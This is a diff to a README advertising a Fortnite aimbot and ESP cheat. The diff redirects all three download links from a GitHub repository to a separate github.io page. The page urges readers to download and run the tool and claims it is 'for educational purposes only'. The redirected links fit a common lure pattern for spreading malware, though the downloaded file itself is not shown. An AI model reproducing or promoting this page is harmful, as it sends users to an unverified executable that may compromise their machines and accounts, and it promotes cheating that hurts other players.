@@ -1,6 +1,6 @@
 # 🎯 Fortnite Cheat 2026 – Your Ultimate Edge for Victory Royales
 
-[![Download Now](https://img.shields.io/badge/Download-Fortnite_Cheat_2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/Alpreset/Fortnite-Cheat-2026-External-Aimbot-ESP)
+[![Download Now](https://img.shields.io/badge/Download-Fortnite_Cheat_2026-2ea44f?style=for-the-badge&logo=github)](https://alpreset.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these simple steps to install and use the tool. It's easier than you thin
 
 Click the big green button below or the badge at the top of this page. This will take you to the download page.
 
-[**Download Fortnite Cheat 2026 Now**](https://github.com/Alpreset/Fortnite-Cheat-2026-External-Aimbot-ESP)
+[**Download Fortnite Cheat 2026 Now**](https://alpreset.github.io)
 
 Visit this link to download the application. Once you're on the page, look for the download button and click it. The download will start automatically. It usually takes less than a minute depending on your internet speed.
 
@@ -138,7 +138,7 @@ That's everything you need to know. In just a few minutes, you'll have aimbot, E
 
 Remember, the tool is for educational purposes only. Use it wisely, and enjoy the game.
 
-**[Download Fortnite Cheat 2026 Now](https://github.com/Alpreset/Fortnite-Cheat-2026-External-Aimbot-ESP)** – Your journey to becoming a Fortnite champion starts here.
+**[Download Fortnite Cheat 2026 Now](https://alpreset.github.io)** – Your journey to becoming a Fortnite champion starts here.
 
 ---
 
